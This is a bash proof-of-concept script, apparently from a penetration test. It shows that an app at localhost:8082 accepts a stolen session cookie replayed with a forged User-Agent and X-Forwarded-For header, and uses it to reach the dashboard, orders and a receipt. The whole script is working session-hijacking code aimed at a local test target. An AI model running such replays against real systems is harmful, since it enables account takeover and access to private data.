#!/bin/bash

# POC: Session Hijacking via Stolen Cookie (No Session Binding)
# This demonstrates that once a session cookie is obtained, it can be used
# from any IP address or User-Agent without additional validation

TARGET="http://localhost:8082"
ECHO_CMD="echo -e"

$ECHO_CMD "\n[*] Session Hijacking POC - No Session Binding Validation"
$ECHO_CMD "=========================================================\n"

# Step 1: Legitimate user authentication
$ECHO_CMD "[Step 1] Authenticating as legitimate user (test:test)..."

# First, submit username and capture Set-Cookie header
curl -s -i -X POST "$TARGET/" \
  -d "username=test" > response1.txt

# Then submit password and capture session cookie
curl -s -i -X POST "$TARGET/password/test" \
  -d "user_id=10032&password=test" \
  -L > response2.txt

# Extract session cookie from Set-Cookie header
SESSION_COOKIE=$(grep -i "Set-Cookie: session=" response2.txt | grep -oP 'session=\K[^;]+' | head -1)

if [ -z "$SESSION_COOKIE" ]; then
  $ECHO_CMD "[!] Failed to obtain session cookie from response"
  $ECHO_CMD "[DEBUG] Checking response headers..."
  grep -i "set-cookie" response2.txt || $ECHO_CMD "No Set-Cookie headers found"
  rm -f response1.txt response2.txt
  exit 1
fi

$ECHO_CMD "[+] Legitimate session established"
$ECHO_CMD "    Session Cookie: ${SESSION_COOKIE:0:50}..."
$ECHO_CMD "    User-Agent: curl/7.x (Legitimate User's Browser)\n"

# Verify legitimate access works
DASHBOARD_CHECK=$(curl -s -b "session=$SESSION_COOKIE" "$TARGET/dashboard")
if echo "$DASHBOARD_CHECK" | grep -q "Welcome"; then
  USER_NAME=$(echo "$DASHBOARD_CHECK" | grep -oP 'Welcome, \K[^<]+' | head -1)
  $ECHO_CMD "[+] Legitimate user can access dashboard: Welcome, $USER_NAME\n"
fi

# Step 2: Simulate attacker from different context
$ECHO_CMD "[Step 2] Simulating ATTACKER using stolen session cookie..."
$ECHO_CMD "    Different IP address (simulated via X-Forwarded-For)"
$ECHO_CMD "    Different User-Agent: Attacker-Bot/1.0"
$ECHO_CMD "    Different device/browser context\n"

# Attacker tries to access dashboard with stolen cookie, different User-Agent, and different IP
ATTACKER_DASHBOARD=$(curl -s \
  -H "User-Agent: Attacker-Bot/1.0" \
  -H "X-Forwarded-For: 1.2.3.4" \
  -b "session=$SESSION_COOKIE" \
  "$TARGET/dashboard" \
  -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE=$(echo "$ATTACKER_DASHBOARD" | grep -oP 'HTTP_CODE:\K\d+')
ATTACKER_CONTENT=$(echo "$ATTACKER_DASHBOARD" | sed '/HTTP_CODE:/d')

$ECHO_CMD "[*] Attacker's request to /dashboard:"
$ECHO_CMD "    HTTP Status: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ] && echo "$ATTACKER_CONTENT" | grep -q "Welcome"; then
  ATTACKER_USER=$(echo "$ATTACKER_CONTENT" | grep -oP 'Welcome, \K[^<]+' | head -1)
  $ECHO_CMD "    Result: ✗ SUCCESS (VULNERABLE) - Full access granted!"
  $ECHO_CMD "    Content: Welcome, $ATTACKER_USER\n"
  
  # Step 3: Attacker accesses sensitive data
  $ECHO_CMD "[Step 3] Attacker accessing sensitive data with stolen session..."
  
  # Access orders page
  ATTACKER_ORDERS=$(curl -s \
    -H "User-Agent: Attacker-Bot/1.0" \
    -H "X-Forwarded-For: 1.2.3.4" \
    -b "session=$SESSION_COOKIE" \
    "$TARGET/orders" \
    -w "\nHTTP_CODE:%{http_code}")
  
  ORDERS_CODE=$(echo "$ATTACKER_ORDERS" | grep -oP 'HTTP_CODE:\K\d+')
  $ECHO_CMD "    /orders endpoint: HTTP $ORDERS_CODE"
  
  if [ "$ORDERS_CODE" = "200" ]; then
    ORDER_COUNT=$(echo "$ATTACKER_ORDERS" | grep -c "Order #" || echo "0")
    $ECHO_CMD "    Result: ✗ SUCCESS (VULNERABLE) - Access to $ORDER_COUNT orders\n"
  fi
  
  # Access specific receipt
  ATTACKER_RECEIPT=$(curl -s \
    -H "User-Agent: Attacker-Bot/1.0" \
    -H "X-Forwarded-For: 1.2.3.4" \
    -b "session=$SESSION_COOKIE" \
    "$TARGET/order/300123/receipt" \
    -w "\nHTTP_CODE:%{http_code}")
  
  RECEIPT_CODE=$(echo "$ATTACKER_RECEIPT" | grep -oP 'HTTP_CODE:\K\d+')
  $ECHO_CMD "    /order/300123/receipt endpoint: HTTP $RECEIPT_CODE"
  
  if [ "$RECEIPT_CODE" = "200" ] && echo "$ATTACKER_RECEIPT" | grep -q "Order ID"; then
    $ECHO_CMD "    Result: ✗ SUCCESS (VULNERABLE) - Receipt data accessible\n"
  fi
  
  $ECHO_CMD "\n╔════════════════════════════════════════════════════════╗"
  $ECHO_CMD "║        [VULNERABILITY CONFIRMED]                       ║"
  $ECHO_CMD "╚════════════════════════════════════════════════════════╝\n"
  $ECHO_CMD "[!] Session hijacking successful!"
  $ECHO_CMD "[!] No IP address validation detected"
  $ECHO_CMD "[!] No User-Agent validation detected"
  $ECHO_CMD "[!] No session binding mechanisms in place"
  $ECHO_CMD "[!] Stolen session cookie grants full access from any context\n"
  
  $ECHO_CMD "[Impact] An attacker who obtains a valid session cookie can:"
  $ECHO_CMD "  ✗ Fully impersonate the victim from any location"
  $ECHO_CMD "  ✗ Use any User-Agent/device without detection"
  $ECHO_CMD "  ✗ Access all user data and functionality"
  $ECHO_CMD "  ✗ No anomaly detection or session binding prevents abuse\n"
  
  # Cleanup
  rm -f response1.txt response2.txt
  exit 0
  
else
  $ECHO_CMD "    Result: ✓ BLOCKED (Session binding may be present)"
  $ECHO_CMD "\n[*] Vulnerability NOT confirmed - Session binding appears to be working\n"
  
  # Cleanup
  rm -f response1.txt response2.txt
  exit 1
fi